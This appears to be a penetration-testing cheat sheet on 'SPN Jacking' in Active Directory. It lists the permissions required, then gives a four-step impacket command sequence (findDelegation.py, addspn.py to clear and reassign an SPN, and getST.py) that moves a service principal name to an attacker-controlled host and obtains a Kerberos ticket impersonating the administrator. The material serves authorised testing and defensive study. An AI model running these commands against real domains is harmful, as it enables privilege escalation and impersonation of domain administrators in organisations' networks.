# SPN Jacking

## Requirements
1. A service configured with KCD.
2. Ability to set SPN over a account. (GenericAll, GenericWrite, WriteProperty)
3. Ability to  remove SPN from a account. (GenericAll, GenericWrite, WriteProperty)

-> the attacker can also impersonate users (e.g. domain admins) on the target services. Depending on the SPNs in `msDS-AllowedToDelegateTo` what if you can change the SPN to yours need.



**Note:** One SPN can be set to only one service so both permission are required to add to the new host  that you control and remove from the host that already has that SPN.

```bash
# 1. show SPNs listed in the KCD configuration
findDelegation.py -user 'serverA$' "$DOMAIN"/"$USER":"$PASSWORD"

# 2. remove SPN from ServerB if required (live SPN-jacking)
addspn.py --clear -t 'ServerB$' -u "$DOMAIN"/"$USER" -p "$PASSWORD" "$DC_HOST"

# 3. add SPN to serverC
addspn.py -t 'ServerC$' --spn "cifs/serverB" -u "$DOMAIN"/"$USER" -p "$PASSWORD" "$DC_HOST"

# 4. request an impersonating service ticket for the SPN through S4U2self + S4U2proxy
getST.py -spn "cifs/serverB" -impersonate "administrator" "$DOMAIN/serverA$:$PASSWORD" -altservice "cifs/serverC"
```

